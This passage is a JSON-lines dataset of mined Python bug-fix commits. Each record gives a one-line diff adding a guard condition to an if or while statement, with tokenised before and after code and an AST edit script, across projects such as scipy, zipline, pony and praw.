{"project": "pony", "commit_sha": "33d5b5e30cd4a6841cc90dd17f4e235be6c0d716", "parent_sha": "401fdf3bedc49f335f19f052c2c9c0d7446d475c", "file_path": "pony/orm/ormtypes.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ def get_normalized_type_of(value):\n     except TypeError: throw(TypeError, 'Unsupported type %r' % t.__name__)\n     if t.__name__ == 'EntityMeta': return SetType(value)\n     if t.__name__ == 'EntityIter': return SetType(value.entity)\n-    if isinstance(value, str):\n+    if PY2 and isinstance(value, str):\n         try: value.decode('ascii')\n         except UnicodeDecodeError: raise\n         else: return unicode\n", "before": "if isinstance ( value , str ) : try : value . decode ( 'ascii' ) except UnicodeDecodeError : raise else : return unicode", "after": "if PY2 and isinstance ( value , str ) : try : value . decode ( 'ascii' ) except UnicodeDecodeError : raise else : return unicode", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 29], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:PY2\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 30], 2]]"}
{"project": "pony", "commit_sha": "1586aff983d9ca8d18ba7e751b70e315890a7b98", "parent_sha": "1c916f796e4e4551889c3c6a15bb66e6485ce750", "file_path": "pony/routing.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -199,7 +199,7 @@ class Route(object):\n             else: self.list = list2\r\n             self.func.__dict__.setdefault('routes', []).insert(0, self)\r\n             self.list.insert(0, self)\r\n-            if self.system: system_routes.append(self)\r\n+            if self.system and self not in system_routes: system_routes.append(self)\r\n             else: global has_user_routes; has_user_routes = True\r\n         finally: registry_lock.release()\r\n \r\n", "before": "if self . system : system_routes . append ( self ) else : global has_user_routes has_user_routes = True", "after": "if self . system and self not in system_routes : system_routes . append ( self ) else : global has_user_routes has_user_routes = True", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 65], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 27], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:system_routes\", \"T\"], 3]]"}
{"project": "genologics", "commit_sha": "675e923261bbcbec1a34edeb1984d75231f94166", "parent_sha": "ba6fb5c50e4295525ba19fdb314b8e5a12894e73", "file_path": "genologics/epp.py", "project_url": "https://github.com/BigelowLab/genologics", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class EppLogger(object):\n         self.log_file = log_file\n         self.level = level\n         self.prepend = prepend\n-        if prepend:\n+        if prepend and not (self.log_file == sys.stdout):\n             self.prepend_old_log()\n \n         # Loggers that will capture stdout and stderr respectively\n", "before": "if prepend : self . prepend_old_log ( )", "after": "if prepend and not ( self . log_file == sys . stdout ) : self . prepend_old_log ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 35], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:prepend\", 3, 12, 3, 19], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"parenthesized_expression\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 2], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:log_file\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:stdout\", \"T\"], 2]]"}
{"project": "coursebuilder-core", "commit_sha": "3dc1d5ef40faf13e03c69d28a29728fe20cbe02d", "parent_sha": "8b026f00dc2fb2cf2cd8cff0d315edff595b2a47", "file_path": "coursebuilder/common/tags.py", "project_url": "https://github.com/imisi-akande/coursebuilder-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -484,7 +484,7 @@ def get_components_from_html(html, use_lxml=_LXML_AVAILABLE):\n-    if use_lxml:\n+    if use_lxml and _LXML_AVAILABLE:\n         return get_components_using_lxml(html)\n     else:\n         return get_components_using_html5lib(html)\n", "before": "if use_lxml : return get_components_using_lxml ( html ) else : return get_components_using_html5lib ( html )", "after": "if use_lxml and _LXML_AVAILABLE : return get_components_using_lxml ( html ) else : return get_components_using_html5lib ( html )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 5, 3, 51], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:use_lxml\", 0, 8, 0, 16], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_LXML_AVAILABLE\", \"T\"], 2]]"}
{"project": "zipline", "commit_sha": "473dafcfb6e7d6c0862f4f1f1b97283c16b66bc0", "parent_sha": "7ce3667bc2401a420e7aaa45fee970f52c025c37", "file_path": "zipline/gens/tradesimulation.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -222,7 +222,7 @@ class AlgorithmSimulator(object):\n                 # update our universe, but don't start a snapshot or\n                 # pass anything to handle_data.  Discard any\n                 # perf messages.\n-                if event.dt < self.algo_start:\n+                if event.dt != 'DONE' and event.dt < self.algo_start:\n                     self.update_universe(event)\n                     if event.perf_message:\n                         log.info(\"Discarding perf message because we're in warmup.\")\n", "before": "if event . dt < self . algo_start : self . update_universe ( event ) if event . perf_message : log . info ( \"Discarding perf message because we're in warmup.\" )", "after": "if event . dt != 'DONE' and event . dt < self . algo_start : self . update_universe ( event ) if event . perf_message : log . info ( \"Discarding perf message because we're in warmup.\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 85], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 46], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'DONE'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:event\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:dt\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "e9db1fd8163a6a18c9e9f8a4c0319e2985cba03e", "parent_sha": "64fcd10afb958be39748d0d9887d4ed5cf9779fc", "file_path": "lib/python/Tools/Directories.py", "project_url": "https://github.com/sotocirus/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def resolveFilename(scope, base = \"\"):\n \t\tif (not pathExists(defaultPaths[scope][0])):\n \t\t\tos.mkdir(path[0])\n \t\t\t\n-\tif base[0] == '/':\n+\tif len(base > 0) and base[0] == '/':\n \t\tpath = \"\"\n \t\n \tif not fileExists(path[0] + base):\n", "before": "if base [ 0 ] == '/' : path = \"\"", "after": "if len ( base > 0 ) and base [ 0 ] == '/' : path = \"\"", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 2, 4, 12], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 5, 3, 19], 2], [\"Insert\", \"N1\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:base\", \"T\"], 0], [\"Insert\", \"N3\", [\">:>\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 2]]"}
{"project": "boxus", "commit_sha": "698a2e8f65dabc5ad5b02994c42b7a8ab0fab2c9", "parent_sha": "d57f07f3df95180e713c20d47661cf079d9b4cec", "file_path": "boxus/sensor.py", "project_url": "https://github.com/boxus-plants/boxus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class Sensor(Controllable):\n \n     def readings_since(self, start_date, options=dict()):\n         field = DateTimeField()\n-        if options['descending']:\n+        if 'descending' in options and options['descending']:\n             options['endkey'] = field._to_json(start_date)\n         else:\n             options['startkey'] = field._to_json(start_date)\n", "before": "if options [ 'descending' ] : options [ 'endkey' ] = field . _to_json ( start_date ) else : options [ 'startkey' ] = field . _to_json ( start_date )", "after": "if 'descending' in options and options [ 'descending' ] : options [ 'endkey' ] = field . _to_json ( start_date ) else : options [ 'startkey' ] = field . _to_json ( start_date )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 61], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 12, 3, 33], 2], [\"Insert\", \"N1\", [\"string:'descending'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:options\", \"T\"], 2]]"}
{"project": "scipy", "commit_sha": "01d0939503989853bffa6ce8ba5d8a21e792568d", "parent_sha": "a27a690528bc1dd56ae8c81d189b09b3b3d7bc62", "file_path": "scipy/special/orthogonal.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -127,7 +127,7 @@ class orthopoly1d(np.poly1d):\n         self.__dict__['_eval_func'] = eval_func\n \n     def __call__(self, v):\n-        if self._eval_func:\n+        if self._eval_func and not isinstance(v, np.poly1d):\n             return self._eval_func(v)\n         else:\n             return np.poly1d.__call__(self, v)\n", "before": "if self . _eval_func : return self . _eval_func ( v ) else : return np . poly1d . __call__ ( self , v )", "after": "if self . _eval_func and not isinstance ( v , np . poly1d ) : return self . _eval_func ( v ) else : return np . poly1d . __call__ ( self , v )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 47], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 27], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:v\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:np\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:poly1d\", \"T\"], 2]]"}
{"project": "scipy", "commit_sha": "d482c3c0ace2d9c08a79881c462335107ce69500", "parent_sha": "1755a9f2cec96f9d5f86b4e68fa1814b767962fa", "file_path": "scipy/stats/stats.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3296,7 +3296,7 @@ def spearmanr(a, b=None, axis=0, nan_policy='propagate'):\n \n     contains_nan, nan_policy = _contains_nan(a, nan_policy)\n \n-    if contains_nan and nan_policy == 'omit':\n+    if contains_nan and nan_policy == 'omit' and b is not None:\n         a = ma.masked_invalid(a)\n         b = ma.masked_invalid(b)\n         return mstats_basic.spearmanr(a, b, axis)\n", "before": "if contains_nan and nan_policy == 'omit' : a = ma . masked_invalid ( a ) b = ma . masked_invalid ( b ) return mstats_basic . spearmanr ( a , b , axis )", "after": "if contains_nan and nan_policy == 'omit' and b is not None : a = ma . masked_invalid ( a ) b = ma . masked_invalid ( b ) return mstats_basic . spearmanr ( a , b , axis )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 45], [\"boolean_operator\", 3, 8, 3, 45], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 45], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 45], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:b\", \"T\"], 0], [\"Insert\", \"N0\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N0\", [\"none:None\", \"T\"], 3]]"}
{"project": "sterp", "commit_sha": "d2b87268c9341536bd4b21a413f91ffa74eecffe", "parent_sha": "98429afe91214cd17dae463f17c74582d941b331", "file_path": "utilities/transaction_base.py", "project_url": "https://github.com/gangadharkadam/sterp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class TransactionBase(StatusUpdater):\n \t\t\tif self.meta.get_field(fieldname):\n \t\t\t\tself.doc.fields[fieldname] = val\n \t\t\t\n-\t\tif self.meta.get_field(\"sales_team\"):\n+\t\tif self.meta.get_field(\"sales_team\") and self.doc.customer:\n \t\t\tself.set_sales_team_for_customer()\n \t\t\t\n \tdef set_sales_team_for_customer(self):\n", "before": "if self . meta . get_field ( \"sales_team\" ) : self . set_sales_team_for_customer ( )", "after": "if self . meta . get_field ( \"sales_team\" ) and self . doc . customer : self . set_sales_team_for_customer ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 4, 38], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 6, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:customer\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:doc\", \"T\"], 2]]"}
{"project": "sterp", "commit_sha": "0352f9b8270de20684bb70700f85d40e4289a056", "parent_sha": "fb0274b2495b26e8a18e65e64705a05c8e939065", "file_path": "accounts/doctype/gl_entry/gl_entry.py", "project_url": "https://github.com/gangadharkadam/sterp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ class DocType:\n \t\t\t\t\t_(\" does not belong to the company\") + \": \" + self.doc.company)\n \t\t\t\t\t\t\n def check_negative_balance(account, adv_adj=False):\n-\tif not adv_adj:\n+\tif not adv_adj and account:\n \t\taccount_details = webnotes.conn.get_value(\"Account\", account, \n \t\t\t\t[\"allow_negative_balance\", \"debit_or_credit\"], as_dict=True)\n \t\tif not account_details[\"allow_negative_balance\"]:\n", "before": "if not adv_adj : account_details = webnotes . conn . get_value ( \"Account\" , account , [ \"allow_negative_balance\" , \"debit_or_credit\" ] , as_dict = True ) if not account_details [ \"allow_negative_balance\" ] : ", "after": "if not adv_adj and account : account_details = webnotes . conn . get_value ( \"Account\" , account , [ \"allow_negative_balance\" , \"debit_or_credit\" ] , as_dict = True ) if not account_details [ \"allow_negative_balance\" ] : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 5, 3, 16], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:adv_adj\", 3, 9, 3, 16], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:account\", \"T\"], 2]]"}
{"project": "django-lfs", "commit_sha": "7bbd0c603935d5a0cfeb360241046d1d1cf1d727", "parent_sha": "f7e8441f2f3d3f139525860a3f03f5aa9e00a4a7", "file_path": "lfs/portlet/models/recent_products.py", "project_url": "https://github.com/baffolobill/django-lfs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class RecentProductsPortlet(Portlet):\n             if slug == slug_not_to_display:\n                 continue\n             product = lfs_get_object(Product, slug=slug)\n-            if product.is_product_with_variants() and product.has_variants():\n+            if product and product.is_product_with_variants() and product.has_variants():\n                 product = product.get_default_variant()\n             products.append(product)\n \n", "before": "if product . is_product_with_variants ( ) and product . has_variants ( ) : product = product . get_default_variant ( )", "after": "if product and product . is_product_with_variants ( ) and product . has_variants ( ) : product = product . get_default_variant ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 77], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:product\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 50], 2]]"}
{"project": "osis-common", "commit_sha": "a678ff2c8234888301418ea54f0e23cf6ac5ec5a", "parent_sha": "5a1142d2cdff24b17f458512984493547e844f22", "file_path": "document/xls_build.py", "project_url": "https://github.com/uclouvain/osis-common", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -234,7 +234,7 @@ def _format_all_cells_except_header_line(worksheet1, worksheet_content):\n \n \n def _apply_font_strikethrough(worksheet1, cell, row_number, col_number):\n-    if '\\u0336' in cell and cell.count('\\u0336') == len(cell)/2:\n+    if isinstance(cell, str) and '\\u0336' in cell and cell.count('\\u0336') == len(cell)/2:\n         worksheet_cell = worksheet1.cell(column=col_number, row=row_number)\n         worksheet_cell.value = cell.replace('\\u0336', '')\n         worksheet_cell.font = Font(strikethrough=True)\n", "before": "if '\\u0336' in cell and cell . count ( '\\u0336' ) == len ( cell ) / 2 : worksheet_cell = worksheet1 . cell ( column = col_number , row = row_number ) worksheet_cell . value = cell . replace ( '\\u0336' , '' ) worksheet_cell . font = Font ( strikethrough = True )", "after": "if isinstance ( cell , str ) and '\\u0336' in cell and cell . count ( '\\u0336' ) == len ( cell ) / 2 : worksheet_cell = worksheet1 . cell ( column = col_number , row = row_number ) worksheet_cell . value = cell . replace ( '\\u0336' , '' ) worksheet_cell . font = Font ( strikethrough = True )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 64], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 24], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:cell\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:str\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "django-jet", "commit_sha": "4a2fdc67ba5630285d147c90db9521fc3ae0c4f9", "parent_sha": "de91487e19f3418b930c8ad72a1b22e98b5ee397", "file_path": "jet/templatetags/jet_tags.py", "project_url": "https://github.com/SalahAdDin/django-jet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def jet_get_menu(context):\n     for app in app_list:\n         if not current_found:\n             for model in app['models']:\n-                if context['request'].path.startswith(model['admin_url']):\n+                if 'admin_url' in model and context['request'].path.startswith(model['admin_url']):\n                     model['current'] = True\n                     current_found = True\n                     break\n", "before": "if context [ 'request' ] . path . startswith ( model [ 'admin_url' ] ) : model [ 'current' ] = True current_found = True break", "after": "if 'admin_url' in model and context [ 'request' ] . path . startswith ( model [ 'admin_url' ] ) : model [ 'current' ] = True current_found = True break", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 26], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 74], 2], [\"Insert\", \"N1\", [\"string:'admin_url'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:model\", \"T\"], 2]]"}
{"project": "pretty-midi", "commit_sha": "acd1e17ff0c149ea82d45e358eb26e8c4e552081", "parent_sha": "27072b48c4887d25584a13de489c8f3444194b2c", "file_path": "pretty_midi/pretty_midi.py", "project_url": "https://github.com/adarob/pretty-midi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -280,7 +280,7 @@ This is not a valid type 0 or type 1 MIDI file.  Timing may be wrong.\",\n             # Index of the tempo we're using\n             n = 0\n             # Move past all the tempo changes up to the supplied start time\n-            while beats[-1] > tempo_change_times[n]:\n+            while n < tempo_change_times.shape[0] - 1 and beats[-1] > tempo_change_times[n]:\n                 n += 1\n             # Add beats in\n             while beats[-1] < note_list[-1].start:\n", "before": "while beats [ - 1 ] > tempo_change_times [ n ] : n += 1", "after": "while n < tempo_change_times . shape [ 0 ] - 1 and beats [ - 1 ] > tempo_change_times [ n ] : n += 1", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"while_statement\", 3, 13, 4, 23], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 19, 3, 52], 2], [\"Insert\", \"N1\", [\"identifier:n\", \"T\"], 0], [\"Insert\", \"N1\", [\"<:<\", \"T\"], 1], [\"Insert\", \"N1\", [\"binary_operator\", \"N2\"], 2], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 0], [\"Insert\", \"N2\", [\"-:-\", \"T\"], 1], [\"Insert\", \"N2\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"identifier:tempo_change_times\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:shape\", \"T\"], 2]]"}
{"project": "auto-anime-downloader", "commit_sha": "d739b5b7e4ab592d3db37939029bcb060c931542", "parent_sha": "5b6fd9850fde3ea99bcb17417d8831b75ae47592", "file_path": "net.py", "project_url": "https://github.com/Ayase-252/auto-anime-downloader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def request_get_content(url, retry=0, retry_interval=5, params=[]):\n     try_time = retry + 1\n     r = None\n     print('Retriving data from', url)\n-    while r is None or r.status_code != 200:\n+    while r is None or r.status_code != 200 and try_time != 0:\n         try:\n             r = _make_get_request(url, params)\n         except Exception as e:\n", "before": "while r is None or r . status_code != 200 : try : r = _make_get_request ( url , params ) except Exception as e : ", "after": "while r is None or r . status_code != 200 and try_time != 0 : try : r = _make_get_request ( url , params ) except Exception as e : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 11, 3, 44], [\"boolean_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"comparison_operator\", 3, 24, 3, 44], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:try_time\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2]]"}
{"project": "python-swjsq", "commit_sha": "1acc1c3d9bddec8134c56a11642506803c5712d3", "parent_sha": "26fd54b8206b9cfa33744ef3f392a1216e97fc5d", "file_path": "swjsq.py", "project_url": "https://github.com/timothyqiu/python-swjsq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -212,7 +212,8 @@ def fast_d1ck(uname, pwd, login_type, save = True):\n     if 'sessionID' not in dt:\r\n         uprint('Error: login failed, %s' % dt['errorDesc'], 'Error: login failed')\r\n         os._exit(1)\r\n-    elif 'isVip' not in dt or not dt['isVip']:\r\n+    elif ('isVip' not in dt or not dt['isVip']) and ('payId' not in dt or dt['payId'] != 702):\r\n+        #FIX ME: rewrite if with payId\r\n         print('Error: you are not xunlei vip, buy buy buy! http://vip.xunlei.com/')\r\n         os._exit(2)\r\n     print('Login xunlei succeeded')\r\n", "before": "if 'sessionID' not in dt : uprint ( 'Error: login failed, %s' % dt [ 'errorDesc' ] , 'Error: login failed' ) os . _exit ( 1 ) elif 'isVip' not in dt or not dt [ 'isVip' ] : print ( 'Error: you are not xunlei vip, buy buy buy! http://vip.xunlei.com/' ) os . _exit ( 2 )", "after": "if 'sessionID' not in dt : uprint ( 'Error: login failed, %s' % dt [ 'errorDesc' ] , 'Error: login failed' ) os . _exit ( 1 ) elif ( 'isVip' not in dt or not dt [ 'isVip' ] ) and ( 'payId' not in dt or dt [ 'payId' ] != 702 ) : print ( 'Error: you are not xunlei vip, buy buy buy! http://vip.xunlei.com/' ) os . _exit ( 2 )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 10, 3, 46], [\"parenthesized_expression\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 10, 3, 46], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 10, 3, 46], [\"parenthesized_expression\", \"N1\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 10, 3, 46], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 0], [\"Insert\", \"N2\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N2\", [\"comparison_operator\", \"N4\"], 2], [\"Insert\", \"N3\", [\"string:'payId'\", \"T\"], 0], [\"Insert\", \"N3\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N3\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:dt\", \"T\"], 3], [\"Insert\", \"N4\", [\"subscript\", \"N5\"], 0], [\"Insert\", \"N4\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N4\", [\"integer:702\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:dt\", \"T\"], 0], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N5\", [\"string:'payId'\", \"T\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3]]"}
{"project": "praw", "commit_sha": "53c8e40d7bcb22e44a16f860c75f1f4376ae53de", "parent_sha": "68dc0cb431457499fcab54c9fdac5bc2bc9c0244", "file_path": "praw/objects.py", "project_url": "https://github.com/SIlver--/praw", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -845,7 +845,7 @@ class Submission(Editable, Hideable, Moderatable, Refreshable, Reportable,\n \n             # Fetch new comments and decrease remaining if a request was made\n             new_comments = item.comments(update=False)\n-            if new_comments is not None:\n+            if new_comments is not None and remaining is not None:\n                 remaining -= 1\n             elif new_comments is None:\n                 continue\n", "before": "if new_comments is not None : remaining -= 1 elif new_comments is None : continue", "after": "if new_comments is not None and remaining is not None : remaining -= 1 elif new_comments is None : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 40], 0], [\"Insert\", 